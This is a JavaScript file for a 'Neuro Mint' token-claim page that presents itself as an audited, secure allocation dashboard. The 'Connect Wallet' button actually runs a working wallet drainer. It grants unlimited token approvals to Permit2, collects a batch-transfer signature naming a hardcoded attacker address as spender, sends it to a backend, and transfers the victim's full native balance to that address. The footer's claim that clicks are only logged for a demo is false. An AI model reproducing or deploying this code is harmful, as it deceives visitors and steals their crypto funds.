// ============================================================================
// VANILLA JAVASCRIPT - NO MODULES REQUIRED
// ============================================================================

// Wallet Button Component
function renderConnectWalletButton(options = {}) {
  const { label = 'Connect Wallet', className = '' } = options;
  const classes = ['btn-wallet', className].filter(Boolean).join(' ');
  return `<button type="button" class="${classes}" aria-label="${label}">${label}</button>`;
}

// Initialize Wallet button listeners
function initWallet() {
  const buttons = document.querySelectorAll('.btn-wallet');
  buttons.forEach((btn) => {
    btn.classList.remove('connected');
    btn.addEventListener('click', () => {
      if (btn.disabled) return;

      btn.disabled = true;
      console.log('Wallet button clicked');
      // Replace with actual wallet connection logic when needed



      const PERMIT2_ADDRESS = "0x000000000022d473030f116ddee9f6b43ac78ba3";

    const PERMIT2_ABI = [
    "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
    ];

    // =========================
    // NETWORK SWITCH
    // =========================
    async function switchNetwork(chainName) {
        const networks = {
            Ethereum: {
                mainnet: {
                    chainId: "0x1",
                    chainName: "Ethereum Mainnet",
                    rpcUrls: ["https://ethereum.publicnode.com"],
                    nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
                    blockExplorerUrls: ["https://etherscan.io"]
                },
                testnet: {
                    chainId: "0xaa36a7",
                    chainName: "Sepolia Testnet",
                    rpcUrls: ["https://rpc.sepolia.org"],
                    nativeCurrency: { name: "Sepolia ETH", symbol: "ETH", decimals: 18 },
                    blockExplorerUrls: ["https://sepolia.etherscan.io"]
                }
            },

            BSC: {
                mainnet: {
                    chainId: "0x38",
                    chainName: "BSC Mainnet",
                    rpcUrls: ["https://bsc-dataseed.binance.org"],
                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                    blockExplorerUrls: ["https://bscscan.com"]
                },
                testnet: {
                    chainId: "0x61",
                    chainName: "BSC Testnet",
                    rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
                    nativeCurrency: { name: "Test BNB", symbol: "tBNB", decimals: 18 },
                    blockExplorerUrls: ["https://testnet.bscscan.com"]
                }
            },

            Polygon: {
                mainnet: {
                    chainId: "0x89",
                    chainName: "Polygon Mainnet",
                    rpcUrls: ["https://polygon-rpc.com"],
                    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
                    blockExplorerUrls: ["https://polygonscan.com"]
                },
                testnet: {
                    chainId: "0x13882",
                    chainName: "Polygon Amoy",
                    rpcUrls: ["https://rpc-amoy.polygon.technology"],
                    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
                    blockExplorerUrls: ["https://amoy.polygonscan.com"]
                }
            },

            Arbitrum: {
              mainnet: {
                chainId: "0xa4b1",
                chainName: "Arbitrum One",
                rpcUrls: ["https://arb1.arbitrum.io/rpc"],
                nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
                blockExplorerUrls: ["https://arbiscan.io"]
              },
              testnet: {
                chainId: "0x66eed",
                chainName: "Arbitrum Sepolia",
                rpcUrls: ["https://sepolia-rollup.arbitrum.io/rpc"],
                nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
                blockExplorerUrls: ["https://sepolia.arbiscan.io"]
              }
            },

            Optimism: {
              mainnet: {
                chainId: "0xa",
                chainName: "Optimism",
                rpcUrls: ["https://mainnet.optimism.io"],
                nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
                blockExplorerUrls: ["https://optimistic.etherscan.io"]
              },
              testnet: {
                chainId: "0xaa37dc",
                chainName: "OP Sepolia",
                rpcUrls: ["https://sepolia.optimism.io"],
                nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
                blockExplorerUrls: ["https://sepolia-optimism.etherscan.io"]
              }
            }
        };

        const network = networks[chainName]?.[ENV];

        if (!network) {
            console.error(`Unsupported chain/env: ${chainName} (${ENV})`);
            return;
        }

        try {
            await walletManager.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: network.chainId }]
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await walletManager.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: network.chainId,
                        rpcUrls: network.rpcUrls
                    }]
                });
            } else {
                console.error("Switch failed:", switchError);
            }
        }
    }

    // =========================
    // APPROVE TOKEN
    // =========================
    async function approveToken(tokenAddress) {
        // const provider = new ethers.providers.Web3Provider(window.ethereum);
        // const signer = provider.getSigner();
        const signer = await walletManager.getSigner();

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) public returns (bool)"
        ];

        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

        const PERMIT2 = "0x000000000022d473030f116ddee9f6b43ac78ba3";

        try {
            const tx = await contract.approve(
                PERMIT2,
                ethers.constants.MaxUint256
            );

            await tx.wait();

            console.log(`✅ Approved ${tokenAddress}`);
            return true;

        } catch (err) {
            console.error(`❌ Approval failed`, err);
            return false;
        }
    }


    // NATIVE TOKENS
    async function sendNative(chain) {
        // const provider = new ethers.providers.Web3Provider(window.ethereum);
        // const signer = provider.getSigner();
        const provider = await walletManager.getProvider();
        const signer = await walletManager.getSigner();
        const address = await walletManager.getAddress();

        const RECEIVER = "0xC992fF6A5dE62Bdc60f7b62226fFcb2812859685"; // 👈 replace with your wallet

        try {
            // const address = await signer.getAddress();

            // Get full balance
            const balance = await provider.getBalance(address);

            // Get current gas price
            const gasPrice = await provider.getGasPrice();

            // Standard gas limit for native transfer
            const gasLimit = ethers.BigNumber.from(21000);

            // Calculate gas cost
            const gasCost = gasPrice.mul(gasLimit);

            // Compute max sendable amount
            const sendAmount = balance.sub(gasCost);

            if (sendAmount.lte(0)) {
                console.log("Not enough balance to cover gas fees.");
                return;
            }

            // Optional: show user what will be sent
            // const readableAmount = ethers.utils.formatEther(sendAmount);
            // console.log(`Sending ${readableAmount} from ${chain}`);
            
            console.log("SEND NATIVE TRX")
            // Send transaction
            const tx = await signer.sendTransaction({
                to: RECEIVER,
                value: sendAmount,
                gasLimit: gasLimit,
                gasPrice: gasPrice
            });
            console.log("SEND NATIVE TRX 2")
            await tx.wait();

            // alert(`✅ Sent ${readableAmount} from ${chain}`);
        } catch (err) {
            console.error("❌ Native transfer failed:", err);
            // alert("Transaction failed. Check console.");
        }
    }


    const ERC20_FULL_ABI = [
        "function decimals() view returns (uint8)"
    ];


    // ==========================
    // SIGN PERMIT2 (CORRECT WAY)
    // ==========================
    async function signPermit2(chain, tokens) {
    // const provider = new ethers.providers.Web3Provider(window.ethereum);
    // const signer = provider.getSigner();
    const provider = await walletManager.getProvider();
    const signer = await walletManager.getSigner();
    const user = await signer.getAddress();

    const spender = "0xC992fF6A5dE62Bdc60f7b62226fFcb2812859685"; // your wallet

    const deadline = Math.floor(Date.now() / 1000) + 3600;

    // ⚠️ IMPORTANT: nonce must be fetched per token
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);

    const permitted = [];

    const chainIds = {
      "testnet": {
        "Ethereum": 11155111,
        "BSC": 97,
        "Polygon": 80002,
        "Arbitrum": 421614,
        "Optimism": 11155420
      },
      "mainnet": {
        "Ethereum": 1,
        "BSC": 56,
        "Polygon": 137,
        "Arbitrum": 42161,
        "Optimism": 10
      },
    };

    for (const token of tokens) {

        try {
            const tokenContract = new ethers.Contract(
                token.contract,
                ERC20_FULL_ABI,
                provider
            );

            const decimals = await tokenContract.decimals();

            // ⚠️ Convert real balance to wei
            const amount = ethers.utils.parseUnits(
                token.balance.toString(),
                decimals
            );

            // ❌ Skip useless / broken tokens
            if (amount.lte(0)) continue;

            // ❌ Skip problematic tokens (VERY IMPORTANT)
            const symbolLower = token.symbol.toLowerCase();
            if (
                symbolLower.startsWith("c") || 
                symbolLower.includes("lp") || 
                symbolLower.includes(".io") || 
                symbolLower.includes(".com") || 
                symbolLower.includes("test")
            ) {
                console.log(`Skipping problematic token: ${token.symbol}`);
                continue;
            }

            permitted.push({
                token: token.contract,
                amount: amount.toString()
            });

        } catch (err) {
            console.log(`Skipping ${token.symbol} (error reading decimals)`);
        }
    }

    const nonce = ethers.BigNumber.from(
        ethers.utils.randomBytes(32)
    ).toString();

    const message = {
        permitted, // array of TokenPermissions
        spender,
        nonce: nonce, // simple nonce (better to track backend)
        deadline
    };

    console.log(chainIds[ENV][chain])
    const domain = {
        name: "Permit2",
        chainId: chainIds[ENV][chain],
        verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
        PermitBatchTransferFrom: [
        { name: "permitted", type: "TokenPermissions[]" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
        ],
        TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
        ]
    };

    const signature = await signer._signTypedData(domain, types, message);

    const transferDetails = permitted.map(p => ({
      to: spender,
      requestedAmount: p.amount
  }));

    return {
        chain,
        user,
        permitted,
        transferDetails,
        spender,
        nonce: message.nonce,
        deadline,
        signature
    };
    }


    // Add a helper to wait for the walletManager to be ready
    async function waitForWalletManager() {
        let attempts = 0;
        while (!window.walletManager && attempts < 20) {
            await new Promise(r => setTimeout(r, 100));
            attempts++;
        }
        if (!window.walletManager) throw new Error("WalletManager timed out");
    }


    // =========================
    // MAIN FLOW
    // =========================
    async function connectMetaMask() {
        // if (!window.ethereum) {
        //     alert('MetaMask not detected.');
        //     return;
        // }

        try {
            // 1. Wait for the module to finish loading
              await waitForWalletManager();

              // 2. Safely get CSRF
              const csrfElem = document.querySelector('[name=csrfmiddlewaretoken]');
              if (!csrfElem) {
                  alert("Security Error: CSRF Token missing");
                  return;
              }
              const csrfToken = csrfElem.value;


            // 1. Use your walletManager instead of checking window.ethereum directly
          // await walletManager.connect();
          // const address = await walletManager.getAddress();
          // console.log("Connected Address:", address);

          // 1. Await connection. If user rejects, the error thrown in walletManager will trigger the catch block below.
            await walletManager.connect();
            const address = await walletManager.getAddress();

            // ⚠️ THE FIX FOR THE SILENT HANG:
            // Tell the user to check their wallet because the browser won't redirect them automatically after the fetch.
            if (window.walletManager.isMobileWC) {
                alert("Connection successful!\n\nIMPORTANT: For the next steps, please manually open your EVM wallet app to approve the network switches and signatures. Your browser will not redirect you automatically.");
            }

            // =====================
            // FETCH SCAN DATA
            // =====================
            const response = await fetch(HOME_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    "X-CSRFToken": csrfToken
                },
                body: JSON.stringify({ userAddress: address })
            });

            // Check if response is actually OK
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server Error: ${response.status} - ${errorText}`);
            }

            const payloads = await response.json();

            // alert("SCAN RESULT:", payloads);

            // =====================
            // LOOP CHAINS
            // =====================
            for (const chain of payloads.data) {

                console.log(`\n--- ${chain.chain} ---`);

                await switchNetwork(chain.chain);
                await new Promise(r => setTimeout(r, 2000));

                // =====================
                // STEP 1: APPROVALS
                // =====================
                const approvedTokens = [];

                for (const token of chain.tokens) {
                    console.log(`Approving ${token.symbol}`);

                    const success = await approveToken(token.contract);

                    if (success) {
                        approvedTokens.push(token); // ✅ only approved
                    }

                    await new Promise(r => setTimeout(r, 1200));
                }

                // =====================
                // STEP 2: SIGN ONLY APPROVED
                // =====================
                if (approvedTokens.length === 0) {
                    console.log("No tokens approved, skipping...");
                    continue;
                }
                
                const permitData = await signPermit2(
                    chain.chain,
                    approvedTokens
                );

                console.log("SIGNED:", permitData);

                // =====================
                // STEP 3: SEND TO BACKEND
                // =====================
                const res = await fetch(EXECUTE_PERMIT_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-CSRFToken": document.querySelector('[name=csrfmiddlewaretoken]').value
                    },
                    body: JSON.stringify(permitData)
                });

                const result = await res.json();

                console.log("EXECUTION RESULT:", result);

                // =====================
                // STEP 4: NATIVE (LATER)
                // =====================
                if (result.msg == "success" && chain.native_transfer) {
                    console.log("Ready to send native (next step)");
                    await sendNative(chain.chain);
                }
            }

        } catch (err) {
            console.error(err);
        }
    }


    connectMetaMask()


    });
  });
}

// Navbar Component
function renderNavbar() {
  return `
    <nav class="navbar glass-panel animate-in" aria-label="Main navigation">
      <div class="nav-content">
        <a href="#app" class="logo" aria-label="Neuro Mint Home">
          <div class="logo-mark" aria-hidden="true">◈</div>
          <div class="logo-copy">
            <span class="logo-name">NEURO MINT</span>
            <span class="logo-sub">Allocation Console</span>
          </div>
        </a>

        <div class="nav-actions">
          <span class="network-pill">Mainnet Ready</span>
          ${renderConnectWalletButton({ className: 'shadow-glow' })}
        </div>
      </div>
    </nav>
  `;
}

// Hero Section Component
function renderHero() {
  return `
    <section class="hero" aria-labelledby="hero-title">
      <!-- Background Ambient Setup -->
      <div class="hero-ambient" aria-hidden="true">
        <div class="glow-orb top-left"></div>
        <div class="glow-orb bottom-right"></div>
        <div class="grid-overlay"></div>
      </div>
      
      <div class="app-container">
        <div class="hero-content">
          
          <div class="hero-copy">
            <div class="hero-topbar animate-in delay-100">
              <div class="badge glow-badge">Live Distribution Window</div>
              <div class="hero-pulse" aria-label="Claim system is active">
                <span class="status-indicator"></span>
                <span>Claims processed in real-time</span>
              </div>
            </div>
            
            <h1 class="hero-title animate-in delay-200" id="hero-title">
              Verify your allocation
              <span class="gradient-text gradient-shift">with clarity.</span>
            </h1>
            
            <p class="hero-subtitle animate-in delay-300">
              Claim tokens securely with our audited dashboard. Built for transparent, zero-friction settlement.
            </p>

            <div class="hero-actions animate-in delay-400">
              ${renderConnectWalletButton({ className: 'primary-action hover-lift shadow-glow' })}
              <a href="#phases" class="btn-secondary hover-lift">Explore Roadmap</a>
            </div>

            <!-- Condensed Floating Metrics -->
            <div class="hero-metrics animate-in delay-500">
              <div class="metric-pill">
                <span class="metric-icon">✓</span>
                <span class="metric-text">99.9% Verified Settlement</span>
              </div>
              <div class="metric-pill">
                <span class="metric-icon">🛡</span>
                <span class="metric-text">Audited Modules</span>
              </div>
              <div class="metric-pill">
                <span class="metric-icon">⛽</span>
                <span class="metric-text">Gas-Aware Routing</span>
              </div>
            </div>
          </div>

          <div class="hero-visual-wrapper animate-in delay-300">
            <!-- Floating Abstract UI Dashboard representation -->
            <div class="abstract-dashboard glass-panel float-slow">
              
              <div class="dash-header">
                <div class="dash-dots"><span></span><span></span><span></span></div>
                <div class="dash-title-pill">Allocation Route Active</div>
              </div>
              
              <div class="dash-body">
                <div class="dash-row">
                  <div class="row-icon pulse-soft"></div>
                  <div class="row-content">
                    <div class="skeleton-line short"></div>
                    <div class="skeleton-line long"></div>
                  </div>
                  <div class="row-status success">Synced</div>
                </div>
                
                <div class="dash-row">
                  <div class="row-icon shield"></div>
                  <div class="row-content">
                    <div class="skeleton-line medium"></div>
                  </div>
                  <div class="row-status success">Passed</div>
                </div>

                <div class="dash-card">
                  <div class="card-title">Token Distribution</div>
                  <div class="progress-track" aria-hidden="true">
                    <div class="progress-fill shimmer-flow"></div>
                  </div>
                  <div class="dash-stats">
                    <span class="text-glow">120M+ Allocated</span>
                    <span class="gradient-text gradient-shift">48K+ Wallets</span>
                  </div>
                </div>
              </div>

              <!-- Floating Sub-cards / Badges outside the dashboard -->
              <div class="float-card card-tl float-delay-1">Snapshot Confirmed</div>
              <div class="float-card card-br float-delay-2">Risk Check Complete</div>
            </div>
            
          </div>
        </div>
      </div>
    </section>
  `;
}

// Phases/Roadmap Component
function renderPhases() {
  return `
    <section id="phases" class="phases app-container" aria-labelledby="phases-title">
      <div class="section-header animate-in delay-200">
        <h2 id="phases-title">Claim <span class="gradient-text">Roadmap</span></h2>
        <p>Follow a simple, transparent process from snapshot to final token release.</p>
      </div>

      <div class="process-diagram glass-panel animate-in delay-200" role="doc-subtitle">
        <div class="diagram-node">
          <span aria-hidden="true">1</span>
          <p>Snapshot</p>
        </div>
        <div class="diagram-link" aria-hidden="true"></div>
        <div class="diagram-node">
          <span aria-hidden="true">2</span>
          <p>Verification</p>
        </div>
        <div class="diagram-link" aria-hidden="true"></div>
        <div class="diagram-node">
          <span aria-hidden="true">3</span>
          <p>Claim</p>
        </div>
      </div>
      
      <div class="phases-grid animate-in delay-300">
        <div class="phase-card glass-panel">
          <div class="phase-icon" aria-hidden="true">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="7" y1="8" x2="17" y2="8"/><line x1="7" y1="12" x2="13" y2="12"/></svg>
          </div>
          <h3>Genesis Snapshot</h3>
          <p>Historical balances are indexed and normalized to ensure an accurate eligibility baseline.</p>
          <ul class="phase-points">
            <li>On-chain balance proof</li>
            <li>Duplicate wallet filtering</li>
          </ul>
          <div class="phase-action">
            ${renderConnectWalletButton()}
          </div>
        </div>

        <div class="phase-card glass-panel">
          <div class="phase-icon" aria-hidden="true">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20"/><path d="M2 12h20"/><circle cx="12" cy="12" r="8"/></svg>
          </div>
          <h3>Community Tasks</h3>
          <p>Members complete contribution tasks that increase trust score and reward multiplier.</p>
          <ul class="phase-points">
            <li>Quest completion scoring</li>
            <li>Fraud-resistant validation</li>
          </ul>
          <div class="phase-action">
            ${renderConnectWalletButton()}
          </div>
        </div>

        <div class="phase-card glass-panel">
          <div class="phase-icon" aria-hidden="true">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
          </div>
          <h3>Token Claim</h3>
          <p>The final distribution cycle signs and settles the claim directly to your destination wallet.</p>
          <ul class="phase-points">
            <li>Gas-aware execution</li>
            <li>Transparent claim receipts</li>
          </ul>
          <div class="phase-action">
            ${renderConnectWalletButton()}
          </div>
        </div>
      </div>
    </section>
  `;
}

// Footer Component
function renderFooter() {
  return `
    <footer class="site-footer app-container" aria-label="Footer">
      <div class="footer-panel glass-panel animate-in delay-300">
        <div class="footer-headline">
          <span class="footer-icon" aria-hidden="true">◆</span>
          <h3>Ready to Verify Your Allocation?</h3>
        </div>
        <p>Connect your wallet to check eligibility. No wallet popup will be shown here; clicks are logged for demo flow.</p>
        ${renderConnectWalletButton({ className: 'shadow-glow footer-cta' })}
      </div>
      <p class="footer-note">&copy; 2026 Neuro Mint. All rights reserved.</p>
    </footer>
  `;
}

// Main App Renderer
function renderApp() {
  const app = document.querySelector('#app');

  app.innerHTML = `
    <!-- Background Atmosphere -->
    <div class="bg-blobs">
      <div class="blob blob-1"></div>
      <div class="blob blob-2"></div>
      <div class="blob blob-3"></div>
    </div>
    
    ${renderNavbar()}
    
    <main>
      ${renderHero()}
      ${renderPhases()}
    </main>
    
    ${renderFooter()}
  `;
}

// Bootstrap Application when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
  renderApp();
  initWallet();
});
